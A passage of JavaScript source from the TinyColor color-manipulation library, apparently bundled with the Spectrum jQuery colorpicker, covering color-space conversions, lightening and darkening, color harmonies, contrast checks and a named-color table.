            this._a = boundAlpha(value);
            this._roundA = mathRound(100*this._a) / 100;
            return this;
        },
        toHsv: function() {
            var hsv = rgbToHsv(this._r, this._g, this._b);
            return { h: hsv.h * 360, s: hsv.s, v: hsv.v, a: this._a };
        },
        toHsvString: function() {
            var hsv = rgbToHsv(this._r, this._g, this._b);
            var h = mathRound(hsv.h * 360), s = mathRound(hsv.s * 100), v = mathRound(hsv.v * 100);
            return (this._a == 1) ?
              "hsv("  + h + ", " + s + "%, " + v + "%)" :
              "hsva(" + h + ", " + s + "%, " + v + "%, "+ this._roundA + ")";
        },
        toHsl: function() {
            var hsl = rgbToHsl(this._r, this._g, this._b);
            return { h: hsl.h * 360, s: hsl.s, l: hsl.l, a: this._a };
        },
        toHslString: function() {
            var hsl = rgbToHsl(this._r, this._g, this._b);
            var h = mathRound(hsl.h * 360), s = mathRound(hsl.s * 100), l = mathRound(hsl.l * 100);
            return (this._a == 1) ?
              "hsl("  + h + ", " + s + "%, " + l + "%)" :
              "hsla(" + h + ", " + s + "%, " + l + "%, "+ this._roundA + ")";
        },
        toHex: function(allow3Char) {
            return rgbToHex(this._r, this._g, this._b, allow3Char);
        },
        toHexString: function(allow3Char) {
            return '#' + this.toHex(allow3Char);
        },
        toHex8: function() {
            return rgbaToHex(this._r, this._g, this._b, this._a);
        },
        toHex8String: function() {
            return '#' + this.toHex8();
        },
        toRgb: function() {
            return { r: mathRound(this._r), g: mathRound(this._g), b: mathRound(this._b), a: this._a };
        },
        toRgbString: function() {
            return (this._a == 1) ?
              "rgb("  + mathRound(this._r) + ", " + mathRound(this._g) + ", " + mathRound(this._b) + ")" :
              "rgba(" + mathRound(this._r) + ", " + mathRound(this._g) + ", " + mathRound(this._b) + ", " + this._roundA + ")";
        },
        toPercentageRgb: function() {
            return { r: mathRound(bound01(this._r, 255) * 100) + "%", g: mathRound(bound01(this._g, 255) * 100) + "%", b: mathRound(bound01(this._b, 255) * 100) + "%", a: this._a };
        },
        toPercentageRgbString: function() {
            return (this._a == 1) ?
              "rgb("  + mathRound(bound01(this._r, 255) * 100) + "%, " + mathRound(bound01(this._g, 255) * 100) + "%, " + mathRound(bound01(this._b, 255) * 100) + "%)" :
              "rgba(" + mathRound(bound01(this._r, 255) * 100) + "%, " + mathRound(bound01(this._g, 255) * 100) + "%, " + mathRound(bound01(this._b, 255) * 100) + "%, " + this._roundA + ")";
        },
        toName: function() {
            if (this._a === 0) {
                return "transparent";
            }

            if (this._a < 1) {
                return false;
            }

            return hexNames[rgbToHex(this._r, this._g, this._b, true)] || false;
        },
        toFilter: function(secondColor) {
            var hex8String = '#' + rgbaToHex(this._r, this._g, this._b, this._a);
            var secondHex8String = hex8String;
            var gradientType = this._gradientType ? "GradientType = 1, " : "";

            if (secondColor) {
                var s = tinycolor(secondColor);
                secondHex8String = s.toHex8String();
            }

            return "progid:DXImageTransform.Microsoft.gradient("+gradientType+"startColorstr="+hex8String+",endColorstr="+secondHex8String+")";
        },
        toString: function(format) {
            var formatSet = !!format;
            format = format || this._format;

            var formattedString = false;
            var hasAlpha = this._a < 1 && this._a >= 0;
            var needsAlphaFormat = !formatSet && hasAlpha && (format === "hex" || format === "hex6" || format === "hex3" || format === "name");

            if (needsAlphaFormat) {
                // Special case for "transparent", all other non-alpha formats
                // will return rgba when there is transparency.
                if (format === "name" && this._a === 0) {
                    return this.toName();
                }
                return this.toRgbString();
            }
            if (format === "rgb") {
                formattedString = this.toRgbString();
            }
            if (format === "prgb") {
                formattedString = this.toPercentageRgbString();
            }
            if (format === "hex" || format === "hex6") {
                formattedString = this.toHexString();
            }
            if (format === "hex3") {
                formattedString = this.toHexString(true);
            }
            if (format === "hex8") {
                formattedString = this.toHex8String();
            }
            if (format === "name") {
                formattedString = this.toName();
            }
            if (format === "hsl") {
                formattedString = this.toHslString();
            }
            if (format === "hsv") {
                formattedString = this.toHsvString();
            }

            return formattedString || this.toHexString();
        },

        _applyModification: function(fn, args) {
            var color = fn.apply(null, [this].concat([].slice.call(args)));
            this._r = color._r;
            this._g = color._g;
            this._b = color._b;
            this.setAlpha(color._a);
            return this;
        },
        lighten: function() {
            return this._applyModification(lighten, arguments);
        },
        brighten: function() {
            return this._applyModification(brighten, arguments);
        },
        darken: function() {
            return this._applyModification(darken, arguments);
        },
        desaturate: function() {
            return this._applyModification(desaturate, arguments);
        },
        saturate: function() {
            return this._applyModification(saturate, arguments);
        },
        greyscale: function() {
            return this._applyModification(greyscale, arguments);
        },
        spin: function() {
            return this._applyModification(spin, arguments);
        },

        _applyCombination: function(fn, args) {
            return fn.apply(null, [this].concat([].slice.call(args)));
        },
        analogous: function() {
            return this._applyCombination(analogous, arguments);
        },
        complement: function() {
            return this._applyCombination(complement, arguments);
        },
        monochromatic: function() {
            return this._applyCombination(monochromatic, arguments);
        },
        splitcomplement: function() {
            return this._applyCombination(splitcomplement, arguments);
        },
        triad: function() {
            return this._applyCombination(triad, arguments);
        },
        tetrad: function() {
            return this._applyCombination(tetrad, arguments);
        }
    };

    // If input is an object, force 1 into "1.0" to handle ratios properly
    // String input requires "1.0" as input, so 1 will be treated as 1
    tinycolor.fromRatio = function(color, opts) {
        if (typeof color == "object") {
            var newColor = {};
            for (var i in color) {
                if (color.hasOwnProperty(i)) {
                    if (i === "a") {
                        newColor[i] = color[i];
                    }
                    else {
                        newColor[i] = convertToPercentage(color[i]);
                    }
                }
            }
            color = newColor;
        }

        return tinycolor(color, opts);
    };

    // Given a string or object, convert that input to RGB
    // Possible string inputs:
    //
    //     "red"
    //     "#f00" or "f00"
    //     "#ff0000" or "ff0000"
    //     "#ff000000" or "ff000000"
    //     "rgb 255 0 0" or "rgb (255, 0, 0)"
    //     "rgb 1.0 0 0" or "rgb (1, 0, 0)"
    //     "rgba (255, 0, 0, 1)" or "rgba 255, 0, 0, 1"
    //     "rgba (1.0, 0, 0, 1)" or "rgba 1.0, 0, 0, 1"
    //     "hsl(0, 100%, 50%)" or "hsl 0 100% 50%"
    //     "hsla(0, 100%, 50%, 1)" or "hsla 0 100% 50%, 1"
    //     "hsv(0, 100%, 100%)" or "hsv 0 100% 100%"
    //
    function inputToRGB(color) {

        var rgb = { r: 0, g: 0, b: 0 };
        var a = 1;
        var ok = false;
        var format = false;

        if (typeof color == "string") {
            color = stringInputToObject(color);
        }

        if (typeof color == "object") {
            if (color.hasOwnProperty("r") && color.hasOwnProperty("g") && color.hasOwnProperty("b")) {
                rgb = rgbToRgb(color.r, color.g, color.b);
                ok = true;
                format = String(color.r).substr(-1) === "%" ? "prgb" : "rgb";
            }
            else if (color.hasOwnProperty("h") && color.hasOwnProperty("s") && color.hasOwnProperty("v")) {
                color.s = convertToPercentage(color.s);
                color.v = convertToPercentage(color.v);
                rgb = hsvToRgb(color.h, color.s, color.v);
                ok = true;
                format = "hsv";
            }
            else if (color.hasOwnProperty("h") && color.hasOwnProperty("s") && color.hasOwnProperty("l")) {
                color.s = convertToPercentage(color.s);
                color.l = convertToPercentage(color.l);
                rgb = hslToRgb(color.h, color.s, color.l);
                ok = true;
                format = "hsl";
            }

            if (color.hasOwnProperty("a")) {
                a = color.a;
            }
        }

        a = boundAlpha(a);

        return {
            ok: ok,
            format: color.format || format,
            r: mathMin(255, mathMax(rgb.r, 0)),
            g: mathMin(255, mathMax(rgb.g, 0)),
            b: mathMin(255, mathMax(rgb.b, 0)),
            a: a
        };
    }


    // Conversion Functions
    // --------------------

    // `rgbToHsl`, `rgbToHsv`, `hslToRgb`, `hsvToRgb` modified from:
    // <http://mjijackson.com/2008/02/rgb-to-hsl-and-rgb-to-hsv-color-model-conversion-algorithms-in-javascript>

    // `rgbToRgb`
    // Handle bounds / percentage checking to conform to CSS color spec
    // <http://www.w3.org/TR/css3-color/>
    // *Assumes:* r, g, b in [0, 255] or [0, 1]
    // *Returns:* { r, g, b } in [0, 255]
    function rgbToRgb(r, g, b){
        return {
            r: bound01(r, 255) * 255,
            g: bound01(g, 255) * 255,
            b: bound01(b, 255) * 255
        };
    }

    // `rgbToHsl`
    // Converts an RGB color value to HSL.
    // *Assumes:* r, g, and b are contained in [0, 255] or [0, 1]
    // *Returns:* { h, s, l } in [0,1]
    function rgbToHsl(r, g, b) {

        r = bound01(r, 255);
        g = bound01(g, 255);
        b = bound01(b, 255);

        var max = mathMax(r, g, b), min = mathMin(r, g, b);
        var h, s, l = (max + min) / 2;

        if(max == min) {
            h = s = 0; // achromatic
        }
        else {
            var d = max - min;
            s = l > 0.5 ? d / (2 - max - min) : d / (max + min);
            switch(max) {
                case r: h = (g - b) / d + (g < b ? 6 : 0); break;
                case g: h = (b - r) / d + 2; break;
                case b: h = (r - g) / d + 4; break;
            }

            h /= 6;
        }

        return { h: h, s: s, l: l };
    }

    // `hslToRgb`
    // Converts an HSL color value to RGB.
    // *Assumes:* h is contained in [0, 1] or [0, 360] and s and l are contained [0, 1] or [0, 100]
    // *Returns:* { r, g, b } in the set [0, 255]
    function hslToRgb(h, s, l) {
        var r, g, b;

        h = bound01(h, 360);
        s = bound01(s, 100);
        l = bound01(l, 100);

        function hue2rgb(p, q, t) {
            if(t < 0) t += 1;
            if(t > 1) t -= 1;
            if(t < 1/6) return p + (q - p) * 6 * t;
            if(t < 1/2) return q;
            if(t < 2/3) return p + (q - p) * (2/3 - t) * 6;
            return p;
        }

        if(s === 0) {
            r = g = b = l; // achromatic
        }
        else {
            var q = l < 0.5 ? l * (1 + s) : l + s - l * s;
            var p = 2 * l - q;
            r = hue2rgb(p, q, h + 1/3);
            g = hue2rgb(p, q, h);
            b = hue2rgb(p, q, h - 1/3);
        }

        return { r: r * 255, g: g * 255, b: b * 255 };
    }

    // `rgbToHsv`
    // Converts an RGB color value to HSV
    // *Assumes:* r, g, and b are contained in the set [0, 255] or [0, 1]
    // *Returns:* { h, s, v } in [0,1]
    function rgbToHsv(r, g, b) {

        r = bound01(r, 255);
        g = bound01(g, 255);
        b = bound01(b, 255);

        var max = mathMax(r, g, b), min = mathMin(r, g, b);
        var h, s, v = max;

        var d = max - min;
        s = max === 0 ? 0 : d / max;

        if(max == min) {
            h = 0; // achromatic
        }
        else {
            switch(max) {
                case r: h = (g - b) / d + (g < b ? 6 : 0); break;
                case g: h = (b - r) / d + 2; break;
                case b: h = (r - g) / d + 4; break;
            }
            h /= 6;
        }
        return { h: h, s: s, v: v };
    }

    // `hsvToRgb`
    // Converts an HSV color value to RGB.
    // *Assumes:* h is contained in [0, 1] or [0, 360] and s and v are contained in [0, 1] or [0, 100]
    // *Returns:* { r, g, b } in the set [0, 255]
     function hsvToRgb(h, s, v) {

        h = bound01(h, 360) * 6;
        s = bound01(s, 100);
        v = bound01(v, 100);

        var i = math.floor(h),
            f = h - i,
            p = v * (1 - s),
            q = v * (1 - f * s),
            t = v * (1 - (1 - f) * s),
            mod = i % 6,
            r = [v, q, p, p, t, v][mod],
            g = [t, v, v, q, p, p][mod],
            b = [p, p, t, v, v, q][mod];

        return { r: r * 255, g: g * 255, b: b * 255 };
    }

    // `rgbToHex`
    // Converts an RGB color to hex
    // Assumes r, g, and b are contained in the set [0, 255]
    // Returns a 3 or 6 character hex
    function rgbToHex(r, g, b, allow3Char) {

        var hex = [
            pad2(mathRound(r).toString(16)),
            pad2(mathRound(g).toString(16)),
            pad2(mathRound(b).toString(16))
        ];

        // Return a 3 character hex if possible
        if (allow3Char && hex[0].charAt(0) == hex[0].charAt(1) && hex[1].charAt(0) == hex[1].charAt(1) && hex[2].charAt(0) == hex[2].charAt(1)) {
            return hex[0].charAt(0) + hex[1].charAt(0) + hex[2].charAt(0);
        }

        return hex.join("");
    }
        // `rgbaToHex`
        // Converts an RGBA color plus alpha transparency to hex
        // Assumes r, g, b and a are contained in the set [0, 255]
        // Returns an 8 character hex
        function rgbaToHex(r, g, b, a) {

            var hex = [
                pad2(convertDecimalToHex(a)),
                pad2(mathRound(r).toString(16)),
                pad2(mathRound(g).toString(16)),
                pad2(mathRound(b).toString(16))
            ];

            return hex.join("");
        }

    // `equals`
    // Can be called with any tinycolor input
    tinycolor.equals = function (color1, color2) {
        if (!color1 || !color2) { return false; }
        return tinycolor(color1).toRgbString() == tinycolor(color2).toRgbString();
    };
    tinycolor.random = function() {
        return tinycolor.fromRatio({
            r: mathRandom(),
            g: mathRandom(),
            b: mathRandom()
        });
    };


    // Modification Functions
    // ----------------------
    // Thanks to less.js for some of the basics here
    // <https://github.com/cloudhead/less.js/blob/master/lib/less/functions.js>

    function desaturate(color, amount) {
        amount = (amount === 0) ? 0 : (amount || 10);
        var hsl = tinycolor(color).toHsl();
        hsl.s -= amount / 100;
        hsl.s = clamp01(hsl.s);
        return tinycolor(hsl);
    }

    function saturate(color, amount) {
        amount = (amount === 0) ? 0 : (amount || 10);
        var hsl = tinycolor(color).toHsl();
        hsl.s += amount / 100;
        hsl.s = clamp01(hsl.s);
        return tinycolor(hsl);
    }

    function greyscale(color) {
        return tinycolor(color).desaturate(100);
    }

    function lighten (color, amount) {
        amount = (amount === 0) ? 0 : (amount || 10);
        var hsl = tinycolor(color).toHsl();
        hsl.l += amount / 100;
        hsl.l = clamp01(hsl.l);
        return tinycolor(hsl);
    }

    function brighten(color, amount) {
        amount = (amount === 0) ? 0 : (amount || 10);
        var rgb = tinycolor(color).toRgb();
        rgb.r = mathMax(0, mathMin(255, rgb.r - mathRound(255 * - (amount / 100))));
        rgb.g = mathMax(0, mathMin(255, rgb.g - mathRound(255 * - (amount / 100))));
        rgb.b = mathMax(0, mathMin(255, rgb.b - mathRound(255 * - (amount / 100))));
        return tinycolor(rgb);
    }

    function darken (color, amount) {
        amount = (amount === 0) ? 0 : (amount || 10);
        var hsl = tinycolor(color).toHsl();
        hsl.l -= amount / 100;
        hsl.l = clamp01(hsl.l);
        return tinycolor(hsl);
    }

    // Spin takes a positive or negative amount within [-360, 360] indicating the change of hue.
    // Values outside of this range will be wrapped into this range.
    function spin(color, amount) {
        var hsl = tinycolor(color).toHsl();
        var hue = (mathRound(hsl.h) + amount) % 360;
        hsl.h = hue < 0 ? 360 + hue : hue;
        return tinycolor(hsl);
    }

    // Combination Functions
    // ---------------------
    // Thanks to jQuery xColor for some of the ideas behind these
    // <https://github.com/infusion/jQuery-xcolor/blob/master/jquery.xcolor.js>

    function complement(color) {
        var hsl = tinycolor(color).toHsl();
        hsl.h = (hsl.h + 180) % 360;
        return tinycolor(hsl);
    }

    function triad(color) {
        var hsl = tinycolor(color).toHsl();
        var h = hsl.h;
        return [
            tinycolor(color),
            tinycolor({ h: (h + 120) % 360, s: hsl.s, l: hsl.l }),
            tinycolor({ h: (h + 240) % 360, s: hsl.s, l: hsl.l })
        ];
    }

    function tetrad(color) {
        var hsl = tinycolor(color).toHsl();
        var h = hsl.h;
        return [
            tinycolor(color),
            tinycolor({ h: (h + 90) % 360, s: hsl.s, l: hsl.l }),
            tinycolor({ h: (h + 180) % 360, s: hsl.s, l: hsl.l }),
            tinycolor({ h: (h + 270) % 360, s: hsl.s, l: hsl.l })
        ];
    }

    function splitcomplement(color) {
        var hsl = tinycolor(color).toHsl();
        var h = hsl.h;
        return [
            tinycolor(color),
            tinycolor({ h: (h + 72) % 360, s: hsl.s, l: hsl.l}),
            tinycolor({ h: (h + 216) % 360, s: hsl.s, l: hsl.l})
        ];
    }

    function analogous(color, results, slices) {
        results = results || 6;
        slices = slices || 30;

        var hsl = tinycolor(color).toHsl();
        var part = 360 / slices;
        var ret = [tinycolor(color)];

        for (hsl.h = ((hsl.h - (part * results >> 1)) + 720) % 360; --results; ) {
            hsl.h = (hsl.h + part) % 360;
            ret.push(tinycolor(hsl));
        }
        return ret;
    }

    function monochromatic(color, results) {
        results = results || 6;
        var hsv = tinycolor(color).toHsv();
        var h = hsv.h, s = hsv.s, v = hsv.v;
        var ret = [];
        var modification = 1 / results;

        while (results--) {
            ret.push(tinycolor({ h: h, s: s, v: v}));
            v = (v + modification) % 1;
        }

        return ret;
    }

    // Utility Functions
    // ---------------------

    tinycolor.mix = function(color1, color2, amount) {
        amount = (amount === 0) ? 0 : (amount || 50);

        var rgb1 = tinycolor(color1).toRgb();
        var rgb2 = tinycolor(color2).toRgb();

        var p = amount / 100;
        var w = p * 2 - 1;
        var a = rgb2.a - rgb1.a;

        var w1;

        if (w * a == -1) {
            w1 = w;
        } else {
            w1 = (w + a) / (1 + w * a);
        }

        w1 = (w1 + 1) / 2;

        var w2 = 1 - w1;

        var rgba = {
            r: rgb2.r * w1 + rgb1.r * w2,
            g: rgb2.g * w1 + rgb1.g * w2,
            b: rgb2.b * w1 + rgb1.b * w2,
            a: rgb2.a * p  + rgb1.a * (1 - p)
        };

        return tinycolor(rgba);
    };


    // Readability Functions
    // ---------------------
    // <http://www.w3.org/TR/AERT#color-contrast>

    // `readability`
    // Analyze the 2 colors and returns an object with the following properties:
    //    `brightness`: difference in brightness between the two colors
    //    `color`: difference in color/hue between the two colors
    tinycolor.readability = function(color1, color2) {
        var c1 = tinycolor(color1);
        var c2 = tinycolor(color2);
        var rgb1 = c1.toRgb();
        var rgb2 = c2.toRgb();
        var brightnessA = c1.getBrightness();
        var brightnessB = c2.getBrightness();
        var colorDiff = (
            Math.max(rgb1.r, rgb2.r) - Math.min(rgb1.r, rgb2.r) +
            Math.max(rgb1.g, rgb2.g) - Math.min(rgb1.g, rgb2.g) +
            Math.max(rgb1.b, rgb2.b) - Math.min(rgb1.b, rgb2.b)
        );

        return {
            brightness: Math.abs(brightnessA - brightnessB),
            color: colorDiff
        };
    };

    // `readable`
    // http://www.w3.org/TR/AERT#color-contrast
    // Ensure that foreground and background color combinations provide sufficient contrast.
    // *Example*
    //    tinycolor.isReadable("#000", "#111") => false
    tinycolor.isReadable = function(color1, color2) {
        var readability = tinycolor.readability(color1, color2);
        return readability.brightness > 125 && readability.color > 500;
    };

    // `mostReadable`
    // Given a base color and a list of possible foreground or background
    // colors for that base, returns the most readable color.
    // *Example*
    //    tinycolor.mostReadable("#123", ["#fff", "#000"]) => "#000"
    tinycolor.mostReadable = function(baseColor, colorList) {
        var bestColor = null;
        var bestScore = 0;
        var bestIsReadable = false;
        for (var i=0; i < colorList.length; i++) {

            // We normalize both around the "acceptable" breaking point,
            // but rank brightness constrast higher than hue.

            var readability = tinycolor.readability(baseColor, colorList[i]);
            var readable = readability.brightness > 125 && readability.color > 500;
            var score = 3 * (readability.brightness / 125) + (readability.color / 500);

            if ((readable && ! bestIsReadable) ||
                (readable && bestIsReadable && score > bestScore) ||
                ((! readable) && (! bestIsReadable) && score > bestScore)) {
                bestIsReadable = readable;
                bestScore = score;
                bestColor = tinycolor(colorList[i]);
            }
        }
        return bestColor;
    };


    // Big List of Colors
    // ------------------
    // <http://www.w3.org/TR/css3-color/#svg-color>
    var names = tinycolor.names = {
        aliceblue: "f0f8ff",
        antiquewhite: "faebd7",
        aqua: "0ff",
        aquamarine: "7fffd4",
        azure: "f0ffff",
        beige: "f5f5dc",
        bisque: "ffe4c4",
        black: "000",
        blanchedalmond: "ffebcd",
        blue: "00f",
        blueviolet: "8a2be2",
        brown: "a52a2a",
        burlywood: "deb887",
        burntsienna: "ea7e5d",
        cadetblue: "5f9ea0",
        chartreuse: "7fff00",
        chocolate: "d2691e",
        coral: "ff7f50",
        cornflowerblue: "6495ed",
        cornsilk: "fff8dc",
        crimson: "dc143c",
        cyan: "0ff",
        darkblue: "00008b",
        darkcyan: "008b8b",
        darkgoldenrod: "b8860b",
        darkgray: "a9a9a9",
        darkgreen: "006400",
        darkgrey: "a9a9a9",
        darkkhaki: "bdb76b",
        darkmagenta: "8b008b",
        darkolivegreen: "556b2f",
        darkorange: "ff8c00",
        darkorchid: "9932cc",
        darkred: "8b0000",
        darksalmon: "e9967a",
        darkseagreen: "8fbc8f",
        darkslateblue: "483d8b",
        darkslategray: "2f4f4f",
        darkslategrey: "2f4f4f",
        darkturquoise: "00ced1",
        darkviolet: "9400d3",
        deeppink: "ff1493",
        deepskyblue: "00bfff",
        dimgray: "696969",
        dimgrey: "696969",
        dodgerblue: "1e90ff",
        firebrick: "b22222",
        floralwhite: "fffaf0",
        forestgreen: "228b22",
        fuchsia: "f0f",
        gainsboro: "dcdcdc",
        ghostwhite: "f8f8ff",
        gold: "ffd700",
        goldenrod: "daa520",
        gray: "808080",
        green: "008000",
        greenyellow: "adff2f",
        grey: "808080",
        honeydew: "f0fff0",
        hotpink: "ff69b4",
        indianred: "cd5c5c",
        indigo: "4b0082",
        ivory: "fffff0",
        khaki: "f0e68c",
        lavender: "e6e6fa",
        lavenderblush: "fff0f5",
        lawngreen: "7cfc00",
        lemonchiffon: "fffacd",
        lightblue: "add8e6",
        lightcoral: "f08080",
        lightcyan: "e0ffff",
        lightgoldenrodyellow: "fafad2",
        lightgray: "d3d3d3",
        lightgreen: "90ee90",
        lightgrey: "d3d3d3",
        lightpink: "ffb6c1",
        lightsalmon: "ffa07a",
        lightseagreen: "20b2aa",
        lightskyblue: "87cefa",
        lightslategray: "789",
        lightslategrey: "789",
        lightsteelblue: "b0c4de",
        lightyellow: "ffffe0",
        lime: "0f0",
        limegreen: "32cd32",
        linen: "faf0e6",
        magenta: "f0f",
        maroon: "800000",
        mediumaquamarine: "66cdaa",
        mediumblue: "0000cd",
        mediumorchid: "ba55d3",
        mediumpurple: "9370db",
        mediumseagreen: "3cb371",
        mediumslateblue: "7b68ee",
        mediumspringgreen: "00fa9a",
        mediumturquoise: "48d1cc",
        mediumvioletred: "c71585",
        midnightblue: "191970",
        mintcream: "f5fffa",
        mistyrose: "ffe4e1",
        moccasin: "ffe4b5",
        navajowhite: "ffdead",
        navy: "000080",
        oldlace: "fdf5e6",
        olive: "808000",
        olivedrab: "6b8e23",
        orange: "ffa500",
        orangered: "ff4500",
        orchid: "da70d6",
        palegoldenrod: "eee8aa",
        palegreen: "98fb98",
        paleturquoise: "afeeee",
        palevioletred: "db7093",
        papayawhip: "ffefd5",
        peachpuff: "ffdab9",
        peru: "cd853f",
        pink: "ffc0cb",
        plum: "dda0dd",
        powderblue: "b0e0e6",
        purple: "800080",
        rebeccapurple: "663399",
        red: "f00",
        rosybrown: "bc8f8f",
        royalblue: "4169e1",
        saddlebrown: "8b4513",
        salmon: "fa8072",
        sandybrown: "f4a460",
        seagreen: "2e8b57",
        seashell: "fff5ee",
        sienna: "a0522d",
        silver: "c0c0c0",
        skyblue: "87ceeb",
        slateblue: "6a5acd",
        slategray: "708090",
        slategrey: "708090",
        snow: "fffafa",
        springgreen: "00ff7f",
        steelblue: "4682b4",
        tan: "d2b48c",
        teal: "008080",
        thistle: "d8bfd8",
        tomato: "ff6347",
        turquoise: "40e0d0",
        violet: "ee82ee",
        wheat: "f5deb3",
        white: "fff",
        whitesmoke: "f5f5f5",
        yellow: "ff0",
        yellowgreen: "9acd32"
    };

    // Make it easy to access colors via `hexNames[hex]`
    var hexNames = tinycolor.hexNames = flip(names);


    // Utilities
    // ---------

    // `{ 'name1': 'val1' }` becomes `{ 'val1': 'name1' }`
    function flip(o) {
        var flipped = { };
        for (var i in o) {
            if (o.hasOwnProperty(i)) {
                flipped[o[i]] = i;
            }
        }
        return flipped;
    }

    // Return a valid alpha value [0,1] with all invalid values being set to 1
    function boundAlpha(a) {
        a = parseFloat(a);

        if (isNaN(a) || a < 0 || a > 1) {
            a = 1;
        }

        return a;
    }

    // Take input from [0, n] and return it as [0, 1]
    function bound01(n, max) {
        if (isOnePointZero(n)) { n = "100%"; }

        var processPercent = isPercentage(n);
        n = mathMin(max, mathMax(0, parseFloat(n)));

        // Automatically convert percentage into number
        if (processPercent) {
            n = parseInt(n * max, 10) / 100;
        }

        // Handle floating point rounding errors
        if ((math.abs(n - max) < 0.000001)) {
            return 1;
        }

        // Convert into [0, 1] range if it isn't already
        return (n % max) / parseFloat(max);
    }

    // Force a number between 0 and 1
    function clamp01(val) {
        return mathMin(1, mathMax(0, val));
    }

    // Parse a base-16 hex value into a base-10 integer
    function parseIntFromHex(val) {
        return parseInt(val, 16);
    }

    // Need to handle 1.0 as 100%, since once it is a number, there is no difference between it and 1
    // <http://stackoverflow.com/questions/7422072/javascript-how-to-detect-number-as-a-decimal-including-1-0>
    function isOnePointZero(n) {
        return typeof n == "string" && n.indexOf('.') != -1 && parseFloat(n) === 1;
    }

    // Check to see if string passed in is a percentage
    function isPercentage(n) {
        return typeof n === "string" && n.indexOf('%') != -1;
    }

    // Force a hex value to have 2 characters
    function pad2(c) {
        return c.length == 1 ? '0' + c : '' + c;
    }

    // Replace a decimal with it's percentage value
    function convertToPercentage(n) {
        if (n <= 1) {
            n = (n * 100) + "%";
        }

        return n;
    }

    // Converts a decimal to a hex value
    function convertDecimalToHex(d) {
        return Math.round(parseFloat(d) * 255).toString(16);
    }
    // Converts a hex value to a decimal
    function convertHexToDecimal(h) {
        return (parseIntFromHex(h) / 255);
    }

    var matchers = (function() {

        // <http://www.w3.org/TR/css3-values/#integers>
        var CSS_INTEGER = "[-\\+]?\\d+%?";

        // <http://www.w3.org/TR/css3-values/#number-value>
        var CSS_NUMBER = "[-\\+]?\\d*\\.\\d+%?";

        // Allow positive/negative integer/number.  Don't capture the either/or, just the entire outcome.
        var CSS_UNIT = "(?:" + CSS_NUMBER + ")|(?:" + CSS_INTEGER + ")";

        // Actual matching.
        // Parentheses and commas are optional, but not required.
        // Whitespace can take the place of commas or opening paren
        var PERMISSIVE_MATCH3 = "[\\s|\\(]+(" + CSS_UNIT + ")[,|\\s]+(" + CSS_UNIT + ")[,|\\s]+(" + CSS_UNIT + ")\\s*\\)?";
        var PERMISSIVE_MATCH4 = "[\\s|\\(]+(" + CSS_UNIT + ")[,|\\s]+(" + CSS_UNIT + ")[,|\\s]+(" + CSS_UNIT + ")[,|\\s]+(" + CSS_UNIT + ")\\s*\\)?";

        return {
            rgb: new RegExp("rgb" + PERMISSIVE_MATCH3),
            rgba: new RegExp("rgba" + PERMISSIVE_MATCH4),
            hsl: new RegExp("hsl" + PERMISSIVE_MATCH3),
            hsla: new RegExp("hsla" + PERMISSIVE_MATCH4),
            hsv: new RegExp("hsv" + PERMISSIVE_MATCH3),
            hsva: new RegExp("hsva" + PERMISSIVE_MATCH4),
            hex3: /^([0-9a-fA-F]{1})([0-9a-fA-F]{1})([0-9a-fA-F]{1})$/,
            hex6: /^([0-9a-fA-F]{2})([0-9a-fA-F]{2})([0-9a-fA-F]{2})$/,
            hex8: /^([0-9a-fA-F]{2})([0-9a-fA-F]{2})([0-9a-fA-F]{2})([0-9a-fA-F]{2})$/
        };
    })();

    // `stringInputToObject`
    // Permissive string parsing.  Take in a number of formats, and output an object
    // based on detected format.  Returns `{ r, g, b }` or `{ h, s, l }` or `{ h, s, v}`
    function stringInputToObject(color) {

        color = color.replace(trimLeft,'').replace(trimRight, '').toLowerCase();
        var named = false;
        if (names[color]) {
            color = names[color];
            named = true;
        }
        else if (color == 'transparent') {
            return { r: 0, g: 0, b: 0, a: 0, format: "name" };
        }

        // Try to match string input using regular expressions.
        // Keep most of the number bounding out of this function - don't worry about [0,1] or [0,100] or [0,360]
        // Just return an object and let the conversion functions handle that.
        // This way the result will be the same whether the tinycolor is initialized with string or object.
        var match;
        if ((match = matchers.rgb.exec(color))) {
            return { r: match[1], g: match[2], b: match[3] };
        }
        if ((match = matchers.rgba.exec(color))) {
            return { r: match[1], g: match[2], b: match[3], a: match[4] };
        }
        if ((match = matchers.hsl.exec(color))) {
            return { h: match[1], s: match[2], l: match[3] };
        }
        if ((match = matchers.hsla.exec(color))) {
            return { h: match[1], s: match[2], l: match[3], a: match[4] };
        }
        if ((match = matchers.hsv.exec(color))) {
            return { h: match[1], s: match[2], v: match[3] };
        }
        if ((match = matchers.hsva.exec(color))) {
            return { h: match[1], s: match[2], v: match[3], a: match[4] };
        }
        if ((match = matchers.hex8.exec(color))) {
            return {
                a: convertHexToDecimal(match[1]),
                r: parseIntFromHex(match[2]),
                g: parseIntFromHex(match[3]),
                b: parseIntFromHex(match[4]),
                format: named ? "name" : "hex8"
            };
        }
        if ((match = matchers.hex6.exec(color))) {
            return {
                r: parseIntFromHex(match[1]),
                g: parseIntFromHex(match[2]),
                b: parseIntFromHex(match[3]),
                format: named ? "name" : "hex"
            };
        }
        if ((match = matchers.hex3.exec(color))) {
            return {
                r: parseIntFromHex(match[1] + '' + match[1]),
                g: parseIntFromHex(match[2] + '' + match[2]),
                b: parseIntFromHex(match[3] + '' + match[3]),
                format: named ? "name" : "hex"
            };
        }

        return false;
    }

    window.tinycolor = tinycolor;
    })();

    $(function () {
        if ($.fn.spectrum.load) {
            $.fn.spectrum.processNativeColorInputs();
        }
    });

});
